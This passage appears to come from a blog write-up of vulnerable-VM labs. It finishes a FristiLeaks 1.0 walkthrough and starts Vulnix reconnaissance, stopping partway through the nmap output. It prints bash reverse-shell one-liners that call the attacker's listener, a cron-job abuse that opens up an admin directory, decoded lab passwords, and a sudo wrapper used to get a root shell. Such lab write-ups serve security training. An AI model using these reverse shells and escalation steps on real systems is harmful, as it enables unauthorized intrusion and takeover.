<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start up listener</span>
</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Inject payload into the webshell for reverse shell</span>
</span></span><span class="line"><span class="cl">/bin/bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.0.158/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">####################################################################</span>
</span></span><span class="line"><span class="cl"><span class="c1">####################################################################</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Popped reverse shell</span>
</span></span><span class="line"><span class="cl">‚ùØ nc -lvnp <span class="m">4444</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.0.158<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.0.134<span class="o">]</span> <span class="m">34811</span>
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">bash-4.1$ whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">apache
</span></span><span class="line"><span class="cl">bash-4.1$
</span></span></code></pre></div><p>Then i found a <code>notes.txt</code> file under <code>/var/www</code> which says this</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ cat /var/www/notes.txt 
</span></span><span class="line"><span class="cl">hey eezeepz your homedir is a mess, go clean it up, just dont delete
</span></span><span class="line"><span class="cl">the important stuff.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-jerry
</span></span></code></pre></div><p>Checking the user <code>eezeepz</code> i also found another <code>notes.txt</code> file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ cat notes.txt 
</span></span><span class="line"><span class="cl">Yo EZ,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I made it possible <span class="k">for</span> you to <span class="k">do</span> some automated checks, 
</span></span><span class="line"><span class="cl">but I did only allow you access to /usr/bin/* system binaries. I did
</span></span><span class="line"><span class="cl">however copy a few extra often needed commands to my 
</span></span><span class="line"><span class="cl">homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
</span></span><span class="line"><span class="cl">from /home/admin/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Don<span class="err">&#39;</span>t forget to specify the full path <span class="k">for</span> each binary!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Just put a file called <span class="s2">&#34;runthis&#34;</span> in /tmp/, each line one command. The 
</span></span><span class="line"><span class="cl">output goes to the file <span class="s2">&#34;cronresult&#34;</span> in /tmp/. It should 
</span></span><span class="line"><span class="cl">run every minute with my account privileges.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">- Jerry
</span></span><span class="line"><span class="cl">bash-4.1$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/home/eezeepz
</span></span><span class="line"><span class="cl">bash-4.1$
</span></span></code></pre></div><blockquote>
<p>The above statement in summary says there is a cronjob running as an unknown user at <code>/tmp</code> with an editable file names <code>runthis</code>, that unknown user only has access to run binary files under the <code>/home/admin/</code>  directory respectively, this binaries have been specified.</p>
</blockquote>
<p>We then need to pick from this binaries for example the <code>chmod</code>  command to change modifications of the path probably <code>/home/admin</code> which we don&rsquo;t have access to</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ ls /home/admin
</span></span><span class="line"><span class="cl">ls: cannot open directory /home/admin: Permission denied
</span></span><span class="line"><span class="cl">bash-4.1$ nano /tmp/runthis
</span></span><span class="line"><span class="cl">bash-4.1$ cat /tmp/runthis
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/home/admin/chmod <span class="m">777</span> /home/admin -R
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></div><p>After 1 minute checking the permissions of the <code>/home/admin</code> directory we now have full RWX access</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ ls -ld /home/admin
</span></span><span class="line"><span class="cl">drwxrwxrwx. <span class="m">2</span> admin admin <span class="m">4096</span> Nov <span class="m">19</span>  <span class="m">2015</span> /home/admin
</span></span><span class="line"><span class="cl">bash-4.1$ <span class="nb">cd</span> /home/admin
</span></span><span class="line"><span class="cl">bash-4.1$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/home/admin
</span></span><span class="line"><span class="cl">bash-4.1$ ls
</span></span><span class="line"><span class="cl">cat    cronjob.py       cryptpass.py  <span class="nb">echo</span>   grep  whoisyourgodnow.txt
</span></span><span class="line"><span class="cl">chmod  cryptedpass.txt  df            egrep  ps
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></div><p>We can then attempt to gain a reverse shell as the unknown user by adding <code>bash</code> binary to <code>/home/admin</code> and then editing the <code>/tmp/runthis</code> file with our reverse shell payload, leaving us with a shell as <code>admin</code> as seen below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ cp /bin/bash ./
</span></span><span class="line"><span class="cl">bash-4.1$ chmod <span class="m">777</span> bash
</span></span><span class="line"><span class="cl">bash-4.1$ nano /tmp/runthis 
</span></span><span class="line"><span class="cl">bash-4.1$ cat /tmp/runthis 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/home/admin/chmod <span class="m">777</span> /home/admin -R
</span></span><span class="line"><span class="cl">/home/admin/bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.0.158/1337 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">####################################################################</span>
</span></span><span class="line"><span class="cl"><span class="c1">####################################################################</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Wait for reverse shell</span>
</span></span><span class="line"><span class="cl">‚ùØ nc -lvnp <span class="m">1337</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1337</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.0.158<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.0.134<span class="o">]</span> <span class="m">42273</span>
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl"><span class="o">[</span>admin@localhost ~<span class="o">]</span>$ whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">admin
</span></span></code></pre></div><p>Now the problem is even if you get a reverse shell, you still have some files that we need to figure out. like the <code>cryptedpass.txt</code>, <code>cryptpass.txt</code> and <code>whoisyourgodnow.txt</code> files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">1548</span>
</span></span><span class="line"><span class="cl">drwxrwxrwx. <span class="m">2</span> admin     admin       <span class="m">4096</span> Aug <span class="m">25</span> 09:15 .
</span></span><span class="line"><span class="cl">drwxr-xr-x. <span class="m">5</span> root      root        <span class="m">4096</span> Nov <span class="m">19</span>  <span class="m">2015</span> ..
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin        <span class="m">129</span> Aug <span class="m">25</span> 09:25 .bash_history
</span></span><span class="line"><span class="cl">-rwxrwxrwx. <span class="m">1</span> admin     admin         <span class="m">18</span> Sep <span class="m">22</span>  <span class="m">2015</span> .bash_logout
</span></span><span class="line"><span class="cl">-rwxrwxrwx. <span class="m">1</span> admin     admin        <span class="m">176</span> Sep <span class="m">22</span>  <span class="m">2015</span> .bash_profile
</span></span><span class="line"><span class="cl">-rwxrwxrwx. <span class="m">1</span> admin     admin        <span class="m">124</span> Sep <span class="m">22</span>  <span class="m">2015</span> .bashrc
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> apache    apache    <span class="m">906152</span> Aug <span class="m">25</span> 09:07 bash
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">45224</span> Nov <span class="m">18</span>  <span class="m">2015</span> cat
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">48712</span> Nov <span class="m">18</span>  <span class="m">2015</span> chmod
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin        <span class="m">737</span> Nov <span class="m">18</span>  <span class="m">2015</span> cronjob.py
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin         <span class="m">21</span> Nov <span class="m">18</span>  <span class="m">2015</span> cryptedpass.txt
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin        <span class="m">258</span> Nov <span class="m">18</span>  <span class="m">2015</span> cryptpass.py
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">90544</span> Nov <span class="m">18</span>  <span class="m">2015</span> df
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">24136</span> Nov <span class="m">18</span>  <span class="m">2015</span> <span class="nb">echo</span>
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin     <span class="m">163600</span> Nov <span class="m">18</span>  <span class="m">2015</span> egrep
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin     <span class="m">163600</span> Nov <span class="m">18</span>  <span class="m">2015</span> grep
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">85304</span> Nov <span class="m">18</span>  <span class="m">2015</span> ps
</span></span><span class="line"><span class="cl">-rwxrwxrwx  <span class="m">1</span> admin     admin       <span class="m">2354</span> Aug <span class="m">25</span> 09:15 typescript
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> fristigod fristigod     <span class="m">25</span> Nov <span class="m">19</span>  <span class="m">2015</span> whoisyourgodnow.txt
</span></span></code></pre></div><p>The script <code>cryptpass.py</code> is designed to take a string input, encode it with <code>base64</code>, reverse the string, apply <code>ROT13</code>, and then print the result.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>admin@localhost ~<span class="o">]</span>$ cat cryptedpass.txt 
</span></span><span class="line"><span class="cl">mVGZ3O3omkJLmy2pcuTq
</span></span><span class="line"><span class="cl"><span class="o">[</span>admin@localhost ~<span class="o">]</span>$ cat cryptpass.py 
</span></span><span class="line"><span class="cl"><span class="c1">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span>
</span></span><span class="line"><span class="cl">import base64,codecs,sys
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def encodeString<span class="o">(</span>str<span class="o">)</span>:
</span></span><span class="line"><span class="cl">    <span class="nv">base64string</span><span class="o">=</span> base64.b64encode<span class="o">(</span>str<span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> codecs.encode<span class="o">(</span>base64string<span class="o">[</span>::-1<span class="o">]</span>, <span class="s1">&#39;rot13&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">cryptoResult</span><span class="o">=</span>encodeString<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">])</span>
</span></span><span class="line"><span class="cl">print cryptoResult
</span></span></code></pre></div><h4 id="reverse-engineering-steps">Reverse Engineering Steps:<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-steps">#</a></h4>
<ol>
<li><strong>Reverse ROT13</strong>: Since ROT13 is symmetric, apply ROT13 again to decode it.</li>
<li><strong>Reverse the String</strong>: Reverse the ROT13-decoded string to get the original base64 string.</li>
<li><strong>Base64 Decode</strong>: Decode the reversed string from base64 to get the original plaintext.</li>
</ol>
<p>The below script did the work for me TBH, using chatgpt assistance</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">codecs</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decodeString</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Step 1: Apply ROT13 again to decode</span>
</span></span><span class="line"><span class="cl">    <span class="n">rot13_decoded</span> <span class="o">=</span> <span class="n">codecs</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">,</span> <span class="s1">&#39;rot13&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Step 2: Reverse the string</span>
</span></span><span class="line"><span class="cl">    <span class="n">reversed_string</span> <span class="o">=</span> <span class="n">rot13_decoded</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Step 3: Decode from base64</span>
</span></span><span class="line"><span class="cl">    <span class="n">original_string</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">reversed_string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">original_string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Example usage</span>
</span></span><span class="line"><span class="cl"><span class="n">encoded_str</span> <span class="o">=</span> <span class="s2">&#34;mVGZ3O3omkJLmy2pcuTq&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">original_str</span> <span class="o">=</span> <span class="n">decodeString</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">original_str</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>  <span class="c1"># Decode from bytes to string if needed</span>
</span></span></code></pre></div><p>Then tried the script for both files and we have clear text password for both user <code>admin</code> and <code>fristigod</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#cryptpass.txt</span>
</span></span><span class="line"><span class="cl">‚ùØ python3 exploit.py
</span></span><span class="line"><span class="cl">thisisalsopw123
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#whoisyourgodnow.txt</span>
</span></span><span class="line"><span class="cl">‚ùØ python3 exploit.py
</span></span><span class="line"><span class="cl">LetThereBeFristi! 
</span></span></code></pre></div><p>You can also do this with <strong>cyberchef</strong>, however i have crafted the recipe so just follow through this <a href="https://cyberchef.io/#recipe=ROT13(true,true,false,13)Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true)&amp;input=PVJGbjBBS25sTUhNUEl6cHl1VEkwSVRH">link</a></p>
<p>Then switched user to <code>fristigod</code> since we don&rsquo;t have access to this user&rsquo;s home folder yet with the cracked password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ su fristigod
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">bash-4.1$ whoami
</span></span><span class="line"><span class="cl">fristigod
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></div><p>Checking sudo privileges we have permission to run a file called <code>doCom</code> at <code>/var/fristigod/.secret_admin_stuff/</code> as user <code>fristigod</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> fristigod on this host:
</span></span><span class="line"><span class="cl">    requiretty, !visiblepw, always_set_home, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&#34;COLORS
</span></span></span><span class="line"><span class="cl"><span class="s2">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;MAIL PS1
</span></span></span><span class="line"><span class="cl"><span class="s2">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_COLLATE
</span></span></span><span class="line"><span class="cl"><span class="s2">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_MONETARY
</span></span></span><span class="line"><span class="cl"><span class="s2">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_TIME LC_ALL
</span></span></span><span class="line"><span class="cl"><span class="s2">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User fristigod may run the following commands on this host:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>fristi : ALL<span class="o">)</span> /var/fristigod/.secret_admin_stuff/doCom
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></div><p>However upon running this the right way i have the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ sudo -u fristigod /var/fristigod/.secret_admin_stuff/doCom
</span></span><span class="line"><span class="cl">Sorry, user fristigod is not allowed to execute <span class="s1">&#39;/var/fristigod/.secret_admin_stuff/doCom&#39;</span> as fristigod on localhost.localdomain.
</span></span></code></pre></div><p>Navigating to <code>/var/fristigod</code> i have a <code>.bash_history</code> file there</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/var/fristigod
</span></span><span class="line"><span class="cl">bash-4.1$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">drwxr-x---   <span class="m">3</span> fristigod fristigod <span class="m">4096</span> Nov <span class="m">25</span>  <span class="m">2015</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x. <span class="m">19</span> root      root      <span class="m">4096</span> Nov <span class="m">19</span>  <span class="m">2015</span> ..
</span></span><span class="line"><span class="cl">-rw-------   <span class="m">1</span> fristigod fristigod  <span class="m">900</span> Aug <span class="m">25</span> 09:42 .bash_history
</span></span><span class="line"><span class="cl">drwxrwxr-x.  <span class="m">2</span> fristigod fristigod <span class="m">4096</span> Nov <span class="m">25</span>  <span class="m">2015</span> .secret_admin_stuff
</span></span></code></pre></div><p>Reading this file i understood more how this command worked ü§£, we need to specify a command next to the actual command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ cat .bash_history 
</span></span><span class="line"><span class="cl">ls
</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">ls -lah
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> .secret_admin_stuff/
</span></span><span class="line"><span class="cl">ls
</span></span><span class="line"><span class="cl">./doCom 
</span></span><span class="line"><span class="cl">./doCom <span class="nb">test</span>
</span></span><span class="line"><span class="cl">sudo ls
</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> .secret_admin_stuff/
</span></span><span class="line"><span class="cl">ls
</span></span><span class="line"><span class="cl">./doCom 
</span></span><span class="line"><span class="cl">sudo -u fristi ./doCom ls /
</span></span><span class="line"><span class="cl">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
</span></span><span class="line"><span class="cl">--SNIP--
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></div><p>So i decided to run the <code>whoami</code> command and we got a response as user <code>root</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom whoami
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> fristigod: 
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /root -la
</span></span><span class="line"><span class="cl">total <span class="m">48</span>
</span></span><span class="line"><span class="cl">dr-xr-x---.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">25</span>  <span class="m">2015</span> .
</span></span><span class="line"><span class="cl">dr-xr-xr-x. <span class="m">22</span> root root <span class="m">4096</span> Aug <span class="m">25</span> 08:51 ..
</span></span><span class="line"><span class="cl">-rw-------   <span class="m">1</span> root root <span class="m">1936</span> Nov <span class="m">25</span>  <span class="m">2015</span> .bash_history
</span></span><span class="line"><span class="cl">-rw-r--r--.  <span class="m">1</span> root root   <span class="m">18</span> May <span class="m">20</span>  <span class="m">2009</span> .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r--.  <span class="m">1</span> root root  <span class="m">176</span> May <span class="m">20</span>  <span class="m">2009</span> .bash_profile
</span></span><span class="line"><span class="cl">-rw-r--r--.  <span class="m">1</span> root root  <span class="m">176</span> Sep <span class="m">22</span>  <span class="m">2004</span> .bashrc
</span></span><span class="line"><span class="cl">drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">25</span>  <span class="m">2015</span> .c
</span></span><span class="line"><span class="cl">-rw-r--r--.  <span class="m">1</span> root root  <span class="m">100</span> Sep <span class="m">22</span>  <span class="m">2004</span> .cshrc
</span></span><span class="line"><span class="cl">-rw-------.  <span class="m">1</span> root root <span class="m">1291</span> Nov <span class="m">17</span>  <span class="m">2015</span> .mysql_history
</span></span><span class="line"><span class="cl">-rw-r--r--.  <span class="m">1</span> root root  <span class="m">129</span> Dec  <span class="m">3</span>  <span class="m">2004</span> .tcshrc
</span></span><span class="line"><span class="cl">-rw-------.  <span class="m">1</span> root root  <span class="m">829</span> Nov <span class="m">17</span>  <span class="m">2015</span> .viminfo
</span></span><span class="line"><span class="cl">-rw-------.  <span class="m">1</span> root root  <span class="m">246</span> Nov <span class="m">17</span>  <span class="m">2015</span> fristileaks_secrets.txt
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></div><p>Spawning a shell as the <code>root</code> user would be as simple as doing this</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash
</span></span><span class="line"><span class="cl">bash-4.1# whoami
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">bash-4.1# <span class="nb">cd</span> /root
</span></span><span class="line"><span class="cl">bash-4.1# ls
</span></span><span class="line"><span class="cl">fristileaks_secrets.txt
</span></span><span class="line"><span class="cl">bash-4.1# cat fristileaks_secrets.txt
</span></span><span class="line"><span class="cl">Congratulations on beating FristiLeaks 1.0 by Ar0xA <span class="o">[</span>https://tldr.nu<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I wonder <span class="k">if</span> you beat it in the maximum <span class="m">4</span> hours it<span class="err">&#39;</span>s supposed to take!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Shoutout to people of <span class="c1">#fristileaks (twitter) and #vulnhub (FreeNode)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Flag: Y0u_kn0w_y0u_l0ve_fr1st1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bash-4.1# 
</span></span></code></pre></div><blockquote>
<p>Please Take note that when stabilizing shells <code>python2</code> should be use.</p>
</blockquote>
<h2 id="challenge-8---hacklab-vulnix">Challenge 8 - HackLAB: Vulnix<a hidden class="anchor" aria-hidden="true" href="#challenge-8---hacklab-vulnix">#</a></h2>
<h4 id="description-1">Description:<a hidden class="anchor" aria-hidden="true" href="#description-1">#</a></h4>
<pre tabindex="0"><code>Here we have a vulnerable Linux host with configuration weaknesses rather than purposely vulnerable software versions (well at the time of release anyway!)

The host is based upon Ubuntu Server 12.04 and is fully patched as of early September 2012. The details are as follows:

- Architecture: x86
- Format: VMware (vmx &amp; vmdk) compatibility with version 4 onwards
- RAM: 512MB
- Network: NAT
- Extracted size: 820MB
- Compressed (download size): 194MB ‚Äì 7zip format ‚Äì 7zip can be obtained from here
- MD5 Hash of Vulnix.7z: 0bf19d11836f72d22f30bf52cd585757    

The goal; boot up, find the IP, hack away and obtain the trophy hidden away in /root by any means you wish ‚Äì excluding the actual hacking of the vmdk

Free free to contact me with any questions/comments using the comments section below.

Enjoy!
</code></pre><p>Running the <code>arp-scan</code> utility we have the following result of our target host.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ sudo arp-scan -l                                                                             
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> sec-fortress:                                                              
</span></span><span class="line"><span class="cl">Interface: wlan0, type: EN10MB, MAC: 1c:4d:70:2c:34:13, IPv4: 192.168.0.158
</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.0.1     98:a9:42:2c:e9:d3       Guangzhou Tozed Kangwei Intelligent Technology Co., LTD 
</span></span><span class="line"><span class="cl">192.168.0.131   1c:4d:70:2c:34:13       Intel Corporate
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">3</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: <span class="m">256</span> hosts scanned in 2.057 seconds <span class="o">(</span>124.45 hosts/sec<span class="o">)</span>. <span class="m">2</span> responded
</span></span></code></pre></div><p>Running our nmap scan we have :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.94SVN scan initiated Sun Aug 25 14:18:08 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.0.131</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> vulnix <span class="o">(</span>192.168.0.131<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0020s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65518</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE    VERSION
</span></span><span class="line"><span class="cl">22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">1024</span> 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf <span class="o">(</span>DSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl">25/tcp    open  smtp       Postfix smtpd
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>vulnix
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>vulnix
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2012-09-02T17:40:12
